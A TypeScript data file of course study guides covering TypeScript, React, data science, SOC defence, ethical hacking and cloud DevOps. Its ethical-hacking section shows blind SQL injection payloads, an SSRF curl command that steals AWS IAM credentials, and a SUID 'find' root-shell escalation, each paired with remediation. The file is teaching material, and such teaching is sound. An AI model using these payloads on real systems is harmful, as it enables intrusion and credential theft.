import { ProgramStudyGuide, ProgramId } from '../types';

export const PROGRAM_STUDY_GUIDES: Record<ProgramId, ProgramStudyGuide> = {
  'software-engineering': {
    programId: 'software-engineering',
    programTitle: 'Full-Stack Software Engineering',
    leadInstructor: 'Marcus Brody (VP of Engineering, ex-Stripe)',
    overview: 'Complete lecture notes, architectural design principles, and production code patterns covering modern TypeScript, React 19 concurrent mechanics, high-throughput Node.js APIs, PostgreSQL relational modeling, Redis caching, and Docker microservices.',
    cheatSheetSummary: [
      'Always prefer discriminated unions over optional fields for state modeling.',
      'Use React 19 Actions and useTransition to keep the UI responsive during non-urgent state updates.',
      'Wrap database operations requiring consistency in explicit SERIALIZABLE or REPEATABLE READ transactions.',
      'Apply the Cache-Aside pattern in Redis with deterministic TTL jitter to avoid cache stampedes.',
      'Enforce non-root execution and multi-stage builds in production Dockerfiles to minimize attack surface.'
    ],
    topics: [
      {
        id: 'se-note-1',
        title: 'Advanced TypeScript: Generics, Mapped Types & Discriminated Unions',
        week: 1,
        summary: 'Deep dive into structural typing, conditional types, mapped types, and crafting type-safe domain models that eliminate runtime null-pointer exceptions.',
        readingTimeMinutes: 15,
        sections: [
          {
            heading: '1. The Core Philosophy of Structural Typing & Type Narrowing',
            content: 'TypeScript uses a structural type system ("duck typing"): two types are compatible if they possess the same shape, regardless of declared names. Discriminated unions allow the compiler to narrow complex domain objects by inspecting a literal discriminator field.',
            codeSnippet: {
              language: 'typescript',
              code: `// Domain-driven Discriminated Union
type ApiResponse<T> =
  | { status: 'idle' }
  | { status: 'loading' }
  | { status: 'success'; data: T; timestamp: number }
  | { status: 'error'; error: Error; retryCount: number };

function handleResponse<T>(res: ApiResponse<T>) {
  switch (res.status) {
    case 'success':
      // TypeScript guarantees res.data is defined here
      console.log('Payload received:', res.data);
      break;
    case 'error':
      console.error('Error occurred:', res.error.message);
      break;
  }
}`
            },
            keyTakeaways: [
              'Discriminated unions ensure that impossible states cannot be represented in code.',
              'Use the "never" type for exhaustive compile-time checking in switch statements.'
            ]
          },
          {
            heading: '2. Generic Constraints & Recursive Utility Types',
            content: 'Generics enable reusable algorithms while preserving type arguments. Constrained generics prevent unsafe operations by bounding the type parameter with the "extends" keyword.',
            codeSnippet: {
              language: 'typescript',
              code: `// DeepReadonly implementation using recursive mapped types
type DeepReadonly<T> = {
  readonly [K in keyof T]: T[K] extends object ? DeepReadonly<T[K]> : T[K];
};

interface UserSession {
  id: string;
  config: { theme: 'dark' | 'light'; notifications: boolean };
}

const session: DeepReadonly<UserSession> = {
  id: 'usr_123',
  config: { theme: 'dark', notifications: true }
};
// session.config.theme = 'light'; // Error: Cannot assign to read only property`
            },
            keyTakeaways: [
              'Use keyof and mapped types to transform existing schema interfaces without duplication.',
              'Keep generics constrained to the minimum necessary surface area.'
            ]
          }
        ]
      },
      {
        id: 'se-note-2',
        title: 'React 19 Architecture: Concurrent Transitions & Server Actions',
        week: 2,
        summary: 'Mastering concurrent rendering, avoiding render waterfalls, and utilizing modern React 19 primitives like useTransition and useActionState.',
        readingTimeMinutes: 18,
        sections: [
          {
            heading: '1. Understanding Fiber Reconciler & Concurrent Priority Queuing',
            content: 'React 19 reconciles components in memory using a cooperative multitasking Fiber tree. By designating updates as transitions, React allows high-priority browser input (typing, clicks) to interrupt heavy render passes.',
            codeSnippet: {
              language: 'typescript',
              code: `import { useState, useTransition } from 'react';

export function SearchCatalog({ items }: { items: string[] }) {
  const [query, setQuery] = useState('');
  const [filtered, setFiltered] = useState(items);
  const [isPending, startTransition] = useTransition();

  const handleSearch = (e: React.ChangeEvent<HTMLInputElement>) => {
    const nextVal = e.target.value;
    // Immediate high-priority update for input typing
    setQuery(nextVal);

    // Non-urgent, interruptible background update for filtering
    startTransition(() => {
      setFiltered(items.filter(item => item.toLowerCase().includes(nextVal.toLowerCase())));
    });
  };

  return (
    <div>
      <input value={query} onChange={handleSearch} placeholder="Search 50k records..." />
      {isPending && <span className="spinner">Filtering dataset...</span>}
      <CatalogList data={filtered} />
    </div>
  );
}`
            },
            keyTakeaways: [
              'useTransition ensures fast UI responsiveness even during heavy client-side computations.',
              'Avoid placing inputs themselves inside startTransition—only wrap state updates that re-render large subtrees.'
            ]
          }
        ]
      },
      {
        id: 'se-note-3',
        title: 'High-Throughput Node.js APIs & Security Hardening',
        week: 3,
        summary: 'Layered controller-service-repository pattern, asynchronous I/O tuning, and defense-in-depth security with JWT refresh token rotation.',
        readingTimeMinutes: 20,
        sections: [
          {
            heading: '1. Production Middleware Pipeline & Authentication',
            content: 'In production systems, never store raw access tokens in localStorage where they are vulnerable to XSS. Use short-lived JWT access tokens in memory and httpOnly, secure, SameSite=Strict cookies for refresh tokens.',
            codeSnippet: {
              language: 'typescript',
              code: `import express, { Request, Response, NextFunction } from 'express';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';

const app = express();
app.use(helmet());
app.use(express.json({ limit: '10kb' })); // Mitigate body bomb DoS

// Rate limiter: max 100 requests per 15 minutes per IP
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', apiLimiter);`
            },
            keyTakeaways: [
              'Always set body parsing limits to avoid heap memory exhaustion attacks.',
              'Implement token rotation: invalidate the entire family of refresh tokens if reuse is detected.'
            ]
          }
        ]
      },
      {
        id: 'se-note-4',
        title: 'PostgreSQL Relational Modeling & Indexing Strategies',
        week: 4,
        summary: 'Schema normalization (3NF), B-Tree vs GIN indexing, ACID guarantees, transaction isolation levels, and diagnosing query plans with EXPLAIN ANALYZE.',
        readingTimeMinutes: 22,
        sections: [
          {
            heading: '1. Indexing Principles & Preventing Table Scans',
            content: 'PostgreSQL stores heap tables unordered. An index provides an auxiliary structure (usually a B-Tree) allowing O(log N) lookups. Multi-column compound indexes follow the Leftmost Prefix rule.',
            codeSnippet: {
              language: 'sql',
              code: `-- Create an index for querying active orders by customer
CREATE INDEX idx_orders_customer_status
ON orders (customer_id, status)
WHERE status != 'cancelled'; -- Partial index saves disk & memory

-- Verify query execution cost with EXPLAIN ANALYZE
EXPLAIN ANALYZE
SELECT id, total_amount
FROM orders
WHERE customer_id = 'c_9981' AND status = 'shipped';`
            },
            keyTakeaways: [
              'Use partial indexes when querying a specific subset of frequently requested records.',
              'Look out for Seq Scan in query plans when an index scan is expected.'
            ]
          }
        ]
      }
    ]
  },

  'data-science': {
    programId: 'data-science',
    programTitle: 'Applied Data Science & Machine Learning',
    leadInstructor: 'Dr. Priya Patel (Lead ML Scientist, ex-DeepMind)',
    overview: 'Comprehensive curriculum notes on NumPy array memory layout, Pandas vectorization, hypothesis testing, tree ensembles (XGBoost/LightGBM), classification under extreme imbalance, and PyTorch deep learning pipelines.',
    cheatSheetSummary: [
      'Avoid Python for-loops when operating over arrays; rely on vectorized SIMD routines.',
      'Check for p-hacking: apply Bonferroni or FDR corrections when running multiple hypothesis tests.',
      'Use Precision-Recall AUC (PR-AUC) instead of ROC-AUC when class distributions are severely imbalanced.',
      'Standardize feature scaling (Z-score normalization) before feeding data into distance-based or gradient descent models.',
      'Monitor validation loss for divergence: save checkpoints using early stopping to avoid overfitting.'
    ],
    topics: [
      {
        id: 'ds-note-1',
        title: 'Vectorized Computing with NumPy & Pandas Memory Architecture',
        week: 1,
        summary: 'Understanding contiguous memory buffers, striding, broadcast semantics, and writing high-speed data manipulation routines.',
        readingTimeMinutes: 16,
        sections: [
          {
            heading: '1. Why Vectorization Outperforms Iterative Loops',
            content: 'Standard Python integers are dynamically typed wrapper objects with substantial overhead. NumPy arrays allocate a contiguous block of homogeneous memory in C, allowing vectorized operations to execute in single CPU instruction cycles (SIMD).',
            codeSnippet: {
              language: 'python',
              code: `import numpy as np
import pandas as pd

# Creating vectorized normalized features
data = np.random.normal(loc=50, scale=15, size=(1000000, 3))

# Vectorized z-score standardization (executed in C / SIMD)
mean = np.mean(data, axis=0)
std = np.std(data, axis=0)
standardized_data = (data - mean) / std

# Pandas method chaining idiom
df = pd.DataFrame(standardized_data, columns=['feat_1', 'feat_2', 'feat_3'])
filtered_df = (
    df.query('feat_1 > 0.5')
      .assign(composite_score=lambda x: x['feat_1'] * 0.6 + x['feat_2'] * 0.4)
      .sort_values(by='composite_score', ascending=False)
)`
            },
            keyTakeaways: [
              'Vectorized operations execute up to 100x faster than traditional for-loops.',
              'Use DataFrame.query() and method chaining to keep transformations pure and legible.'
            ]
          }
        ]
      },
      {
        id: 'ds-note-2',
        title: 'Inferential Statistics, A/B Testing & Hypothesis Testing',
        week: 2,
        summary: 'Formulating null hypotheses, calculating p-values, t-tests, Chi-square tests for independence, and power analysis.',
        readingTimeMinutes: 18,
        sections: [
          {
            heading: '1. Formulating Null Hypotheses & Interpreting P-Values',
            content: 'The null hypothesis (H0) assumes no true effect or difference between groups. The p-value measures the probability of observing results at least as extreme as the sample data under the assumption that H0 is true.',
            codeSnippet: {
              language: 'python',
              code: `from scipy import stats

group_control = [12.4, 14.1, 13.8, 11.9, 15.2, 13.0, 14.5]
group_treatment = [15.8, 16.2, 17.1, 14.9, 16.5, 15.9, 18.0]

# Independent two-sample Welch's t-test (unequal variances)
t_stat, p_val = stats.ttest_ind(group_control, group_treatment, equal_var=False)

print(f"t-statistic: {t_stat:.4f}, p-value: {p_val:.5f}")
if p_val < 0.05:
    print("Reject H0: Statistically significant difference observed.")`
            },
            keyTakeaways: [
              'A p-value below alpha (0.05) indicates that the observed difference is unlikely due to random chance alone.',
              'Always calculate Effect Size (Cohen’s d) alongside p-values to evaluate real-world practical significance.'
            ]
          }
        ]
      },
      {
        id: 'ds-note-3',
        title: 'Gradient Boosted Trees (XGBoost) & Hyperparameter Optimization',
        week: 3,
        summary: 'Mathematical foundations of decision trees, bagging vs boosting, XGBoost objective functions, and automated tuning with Optuna.',
        readingTimeMinutes: 20,
        sections: [
          {
            heading: '1. Gradient Boosting Mechanics',
            content: 'Unlike Random Forests which build independent trees in parallel, Gradient Boosting builds trees sequentially. Each new tree fits the residual errors (gradients of the loss function) made by previous trees.',
            codeSnippet: {
              language: 'python',
              code: `import xgboost as xgb
from sklearn.model_selection import train_test_split
from sklearn.metrics import mean_squared_error

# Configure high-performance XGBoost regressor
model = xgb.XGBRegressor(
    n_estimators=300,
    learning_rate=0.05,
    max_depth=6,
    subsample=0.8,
    colsample_bytree=0.8,
    random_state=42,
    tree_method='hist' # High-speed histogram binning
)

# Early stopping prevents overfitting if validation score plateaus
model.fit(
    X_train, y_train,
    eval_set=[(X_val, y_val)],
    verbose=False
)`
            },
            keyTakeaways: [
              'Set learning_rate low (0.01 - 0.05) and increase n_estimators with early stopping.',
              'Subsample and colsample_bytree act as stochastic regularizers preventing individual trees from dominating.'
            ]
          }
        ]
      }
    ]
  },

  'cyber-security': {
    programId: 'cyber-security',
    programTitle: 'Enterprise Cyber Security & Defensive SecOps',
    leadInstructor: 'Sofia Rodriguez (Principal SOC Architect)',
    overview: 'Defensive blueprints covering deep packet analysis in Wireshark, enterprise SIEM logging with Splunk, writing Suricata IDS signatures, endpoint telemetry with Sysmon, and implementing the NIST Cybersecurity Framework.',
    cheatSheetSummary: [
      'DNS exfiltration can be recognized by high query entropy and abnormally long subdomains.',
      'Monitor Sysmon Event ID 1 (Process Create) and Event ID 3 (Network Connect) for early detection of living-off-the-land attacks.',
      'Suricata rules require precise flow tracking (established, to_server) to avoid flooding SOC consoles with false positives.',
      'Always enforce multi-factor authentication (MFA) and disable legacy unauthenticated protocols like Telnet and SMBv1.',
      'Map all identified security events against the MITRE ATT&CK enterprise matrix to understand adversary campaign objectives.'
    ],
    topics: [
      {
        id: 'cs-note-1',
        title: 'Network Protocol Dissection & Deep Packet Analysis with Wireshark',
        week: 1,
        summary: 'Deconstructing the TCP 3-way handshake, inspecting TLS 1.3 ClientHello handshakes, detecting SYN floods, and analyzing covert DNS tunneling.',
        readingTimeMinutes: 18,
        sections: [
          {
            heading: '1. Dissecting Anomalies in Raw Packet Captures (PCAP)',
            content: 'Attackers frequently use unmonitored protocol channels to exfiltrate enterprise credentials. By analyzing raw PCAPs using display filters in Wireshark, analysts can reconstruct TCP streams and isolate malicious beacons.',
            codeSnippet: {
              language: 'bash',
              code: `# Wireshark Display Filter Expressions for SOC Analysis:

# 1. Filter out all non-DNS traffic with high subdomain length (Covert Tunneling)
dns.flags.response == 0 and dns.qry.name.len > 45

# 2. Identify TCP SYN scans (SYN set, ACK not set)
tcp.flags.syn == 1 and tcp.flags.ack == 0

# 3. Filter plaintext credentials transmitted over HTTP or FTP
http.request.method == "POST" || ftp.request.command == "USER"`
            },
            keyTakeaways: [
              'Inspect TCP window sizes and TTL values: irregular TTL shifts often indicate proxy routing or spoofed origins.',
              'Use follow TCP stream in Wireshark to inspect reconstructed plaintext payloads.'
            ]
          }
        ]
      },
      {
        id: 'cs-note-2',
        title: 'Enterprise SIEM Engineering: Telemetry Ingestion & Splunk SPL',
        week: 2,
        summary: 'Collecting Windows Event Logs, Sysmon telemetry, designing high-fidelity correlation searches, and authoring automated incident alerts.',
        readingTimeMinutes: 20,
        sections: [
          {
            heading: '1. Writing High-Fidelity Splunk Search Processing Language (SPL)',
            content: 'A Security Information and Event Management (SIEM) system ingests gigabytes of disparate logs per day. Effective queries must be indexed, filtered early with boolean operators, and aggregated with statistical commands.',
            codeSnippet: {
              language: 'sql',
              code: `-- Splunk SPL: Detect Pass-the-Hash & Lateral Movement
index=windows_logs EventCode=4624 Logon_Type=3
| search Authentication_Package="NTLM" AND Workstation_Name!="DC*"
| stats count dc(Destination_IP) as TargetCount values(Destination_IP) as Targets by User_Name
| where TargetCount > 5
| sort - TargetCount`
            },
            keyTakeaways: [
              'Logon Type 3 indicates network logon; sudden spikes across multiple endpoints often indicate NTLM relay or lateral movement.',
              'Filter by specific indexes (e.g., index=windows_logs) first before applying pipes to conserve search head compute.'
            ]
          }
        ]
      },
      {
        id: 'cs-note-3',
        title: 'Intrusion Detection Systems (IDS/IPS) & Suricata Signatures',
        week: 3,
        summary: 'Configuring network taps, writing custom Suricata rule signatures, tuning false positives, and inline packet dropping.',
        readingTimeMinutes: 17,
        sections: [
          {
            heading: '1. Anatomy of a Custom Suricata Signature',
            content: 'Suricata inspects live packet streams and compares payloads against declared signature rules. Each rule specifies action, header, protocol, and directional operators.',
            codeSnippet: {
              language: 'bash',
              code: `# Alert on Cobalt Strike Command & Control (C2) malleable HTTP profile
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"CALLIE SEC - Cobalt Strike Beacon Inbound Checkin";
  flow:established,to_server;
  content:"/submit.php?id="; http_uri;
  content:"Cookie|3a 20|SESSIONID="; http_header;
  pcre:"/SESSIONID=[a-zA-Z0-9+\\/]{32,}/H";
  classtype:trojan-activity;
  sid:1000492;
  rev:1;
)`
            },
            keyTakeaways: [
              'Use specific content matches before regex (pcre) to leverage Suricata’s fast pattern matcher algorithm.',
              'Every custom signature must have a unique SID (Security Identifier) above 1,000,000 to avoid conflicting with community rulesets.'
            ]
          }
        ]
      }
    ]
  },

  'ethical-hacking': {
    programId: 'ethical-hacking',
    programTitle: 'Offensive Security & Ethical Hacking',
    leadInstructor: 'Alexandre Dubois (Principal Security Researcher, DEF CON Speaker)',
    overview: 'Penetration testing field manual: adversary reconnaissance methodologies, web application exploitation (OWASP Top 10), SQL injection manual exploitation, Server-Side Request Forgery, Linux privilege escalation via GTFOBins, and Active Directory Kerberoasting.',
    cheatSheetSummary: [
      'Stealth scanning: use -sS (TCP SYN scan) and customize timing flags (-T2 or -T3) to avoid triggering IDS rate limits.',
      'When testing for SQLi, observe application behavioral deviations (timing delays, differential HTTP response sizes).',
      'Exploit SSRF against cloud infrastructure by targeting the AWS/GCP IMDS endpoint (169.254.169.254).',
      'For Linux privilege escalation, check sudo -l permissions and search for binaries with the SUID bit set (find / -perm -4000).',
      'Always obtain explicit written Rules of Engagement (RoE) before testing any IP or host.'
    ],
    topics: [
      {
        id: 'eh-note-1',
        title: 'Adversary Reconnaissance, Port Scanning & Nmap Scripting Engine',
        week: 1,
        summary: 'Target mapping, sub-domain brute forcing, stealth port scanning, service version detection, and automating vulnerability discovery via NSE scripts.',
        readingTimeMinutes: 17,
        sections: [
          {
            heading: '1. Professional Nmap Scanning Workflow',
            content: 'Rushing in with an aggressive scan immediately trips enterprise security alerts. A professional penetration test begins with quiet passive OSINT, followed by selective, surgical network probing.',
            codeSnippet: {
              language: 'bash',
              code: `# Phase 1: Stealth TCP SYN discovery on top 1,000 ports
sudo nmap -sS -Pn -T3 -oN initial_scan.txt 10.0.4.12

# Phase 2: Targeted service identification & default vulnerability scripts on discovered ports
sudo nmap -sV -sC -p 22,80,5432,8080 -oN service_audit.txt 10.0.4.12

# Phase 3: Vulnerability assessment via NSE (Nmap Scripting Engine)
sudo nmap --script vuln -p 80,8080 10.0.4.12`
            },
            keyTakeaways: [
              'The -sS flag leaves the TCP handshake half-open (SYN -> SYN/ACK -> RST), which avoids registering in many application-layer service logs.',
              'Always record findings in multiple output formats (-oA) for formal reporting.'
            ]
          }
        ]
      },
      {
        id: 'eh-note-2',
        title: 'Web Application Exploitation: Advanced SQL Injection & Filter Bypass',
        week: 2,
        summary: 'Union-based SQLi, boolean blind, time-based blind injection, bypassing WAF keyword blacklists, and extracting sensitive password hashes.',
        readingTimeMinutes: 20,
        sections: [
          {
            heading: '1. Mechanics of Time-Based Blind SQL Injection',
            content: 'When an application suppresses all database error messages and renders static content, an ethical hacker can infer information one character at a time by forcing the database engine to sleep for a noticeable interval.',
            codeSnippet: {
              language: 'sql',
              code: `-- Time-based test payload: If admin password starts with 'a', sleep 5 seconds
-- PostgreSQL payload:
' UNION SELECT null, null, CASE WHEN (substring(password, 1, 1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin'--

-- MySQL alternative:
' UNION SELECT 1, IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0)--`
            },
            keyTakeaways: [
              'Time-based blind attacks require automated binary search algorithms to extract data efficiently.',
              'Remediation: Always use parameterized prepared statements; never concatenate user inputs into SQL strings.'
            ]
          }
        ]
      },
      {
        id: 'eh-note-3',
        title: 'Server-Side Request Forgery (SSRF) & Cloud Metadata Pivoting',
        week: 3,
        summary: 'Exploiting image fetchers, webhook endpoints, and PDF generators to force internal HTTP requests against the link-local cloud metadata service.',
        readingTimeMinutes: 19,
        sections: [
          {
            heading: '1. Pivoting from Web Input to Cloud IAM Credentials',
            content: 'Cloud virtual instances (AWS EC2, GCP Compute) query a link-local address (169.254.169.254) to fetch temporary role tokens. If a web application fetches URLs provided by the user, an attacker can extract full IAM credentials.',
            codeSnippet: {
              language: 'bash',
              code: `# Exploiting vulnerable parameter to read AWS IMDSv1
curl -X POST "http://target.com/generate-pdf" \\
     -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role"

# Sample JSON Response returned:
# {
#   "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
#   "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
#   "Token": "AQoDYXdzEJr1...=="
# }`
            },
            keyTakeaways: [
              'Enforce IMDSv2 (Session Token requirement) on all cloud compute instances to neutralize blind SSRF.',
              'Implement egress network firewalls blocking web application servers from routing traffic to 169.254.169.254.'
            ]
          }
        ]
      },
      {
        id: 'eh-note-4',
        title: 'Linux Privilege Escalation via SUID Binaries & GTFOBins',
        week: 4,
        summary: 'Auditing SUID bit executables, misconfigured sudo rules, writable /etc/passwd files, and hijacking shared libraries.',
        readingTimeMinutes: 21,
        sections: [
          {
            heading: '1. Discovering and Exploiting SUID Binaries',
            content: 'The SUID (Set User ID) permission bit allows an executable to run with the permissions of the file owner (often root), rather than the user running it.',
            codeSnippet: {
              language: 'bash',
              code: `# Command to find all SUID executables on a Linux system
find / -perm -u=s -type f 2>/dev/null

# Example exploitation: If /usr/bin/find has SUID permissions
# Reference GTFOBins:
/usr/bin/find . -exec /bin/sh -p \\; -quit

# Spawns a shell with effective user ID = 0 (root)!`
            },
            keyTakeaways: [
              'Regularly audit all SUID binaries on production systems using automated tools like LinPEAS.',
              'Follow the principle of least privilege: strip SUID bits from standard command-line tools like vim, find, or nmap.'
            ]
          }
        ]
      }
    ]
  },

  'cloud-computing': {
    programId: 'cloud-computing',
    programTitle: 'Cloud Architecture & DevOps Engineering',
    leadInstructor: 'Sarah Lin (Staff Infrastructure Architect, Google Cloud)',
    overview: 'Production cloud blueprints covering AWS Multi-AZ VPC design, Terraform Infrastructure as Code, Kubernetes cluster administration, cloud IAM zero-trust access controls, and automated GitOps CI/CD pipelines.',
    cheatSheetSummary: [
      'Always design VPC subnets across at least 2 Availability Zones for high availability.',
      'Lock your Terraform remote state in S3 with DynamoDB state locking to prevent concurrent overwrite corruption.',
      'Kubernetes: Never deploy raw Pods in production; wrap them in Deployments with ReplicaSets and rolling updates.',
      'Assign IAM roles to Kubernetes service accounts (IRSA) rather than hardcoding static AWS credentials inside containers.',
      'Instrument Prometheus ServiceMonitors for automated SLI/SLO latency tracking and error budgeting.'
    ],
    topics: [
      {
        id: 'cc-note-1',
        title: 'Virtual Private Cloud (VPC) Topology & Multi-AZ Subnetting',
        week: 1,
        summary: 'CIDR notation calculations, public vs private subnets, NAT Gateways, Internet Gateways, Route Tables, and Network Access Control Lists (NACLs).',
        readingTimeMinutes: 18,
        sections: [
          {
            heading: '1. Enterprise 3-Tier Multi-AZ Architecture',
            content: 'An enterprise cloud architecture isolates application layers into tiers: Public Web Ingress tier, Private Application Compute tier, and Isolated Database Storage tier without public route access.',
            codeSnippet: {
              language: 'bash',
              code: `# AWS VPC Subnet Allocation (CIDR Block: 10.0.0.0/16)
# AZ 1 (us-east-1a):
Public Subnet:      10.0.1.0/24   (Internet Gateway route)
App Private Subnet: 10.0.10.0/24  (NAT Gateway route)
DB Isolated Subnet: 10.0.20.0/24  (No outbound internet route)

# AZ 2 (us-east-1b):
Public Subnet:      10.0.2.0/24   (Internet Gateway route)
App Private Subnet: 10.0.11.0/24  (NAT Gateway route)
DB Isolated Subnet: 10.0.21.0/24  (No outbound internet route)`
            },
            keyTakeaways: [
              'Database instances must never possess public IPv4 addresses; place them in isolated private subnets.',
              'Security Groups are stateful (inbound allows response automatically); NACLs are stateless and operate at the subnet boundary.'
            ]
          }
        ]
      },
      {
        id: 'cc-note-2',
        title: 'Infrastructure as Code (IaC) with Modern Terraform',
        week: 2,
        summary: 'HashiCorp Configuration Language (HCL), remote backend state management, reusable modules, variable validations, and drift detection.',
        readingTimeMinutes: 19,
        sections: [
          {
            heading: '1. Declarative Resource Provisioning with Remote State',
            content: 'Terraform translates declarative code into API calls to manage cloud lifecycles. Remote state backends ensure that team members do not simultaneously execute conflicting plans.',
            codeSnippet: {
              language: 'hcl',
              code: `# backend.tf: S3 backend with DynamoDB state locking
terraform {
  backend "s3" {
    bucket         = "callie-terraform-state-vault"
    key            = "production/vpc/terraform.tfstate"
    region         = "af-south-1"
    dynamodb_table = "terraform-lock-table"
    encrypt        = true
  }
}

# Declarative Multi-AZ Auto-Scaling Group
resource "aws_autoscaling_group" "app_asg" {
  name_prefix         = "callie-api-"
  vpc_zone_identifier = var.private_subnet_ids
  min_size            = 2
  max_size            = 10
  desired_capacity    = 3
  health_check_type   = "ELB"

  tag {
    key                 = "Environment"
    value               = "Production"
    propagate_at_launch = true
  }
}`
            },
            keyTakeaways: [
              'Always run terraform plan before terraform apply to inspect the speculative execution graph.',
              'Never hardcode credentials or secrets into .tf files; use AWS Secrets Manager or environment variables.'
            ]
          }
        ]
      },
      {
        id: 'cc-note-3',
        title: 'Kubernetes Cluster Architecture: Pods, Services & Ingress',
        week: 3,
        summary: 'Kubernetes control plane mechanics, etcd database, kube-scheduler, declarative deployments, rolling updates, and self-healing pods.',
        readingTimeMinutes: 22,
        sections: [
          {
            heading: '1. Declarative Pod Manifests & Health Probes',
            content: 'Kubernetes reconciles the current state of a cluster to match desired manifests. Liveness and readiness probes prevent deadlocked or uninitialized containers from receiving customer traffic.',
            codeSnippet: {
              language: 'yaml',
              code: `apiVersion: apps/v1
kind: Deployment
metadata:
  name: callie-auth-service
  labels:
    app: auth-service
spec:
  replicas: 3
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  selector:
    matchLabels:
      app: auth-service
  template:
    metadata:
      labels:
        app: auth-service
    spec:
      containers:
      - name: api
        image: 584520702279.dkr.ecr.af-south-1.amazonaws.com/auth-service:v2.4
        ports:
        - containerPort: 3000
        resources:
          limits:
            cpu: "500m"
            memory: "512Mi"
          requests:
            cpu: "100m"
            memory: "128Mi"
        livenessProbe:
          httpGet:
            path: /health
            port: 3000
          initialDelaySeconds: 15
          periodSeconds: 10`
            },
            keyTakeaways: [
              'Always specify resource requests and limits to enable the kube-scheduler to pack worker nodes efficiently.',
              'A readiness probe prevents Kubernetes from routing traffic to a container until its database connection pool is warm.'
            ]
          }
        ]
      }
    ]
  }
};
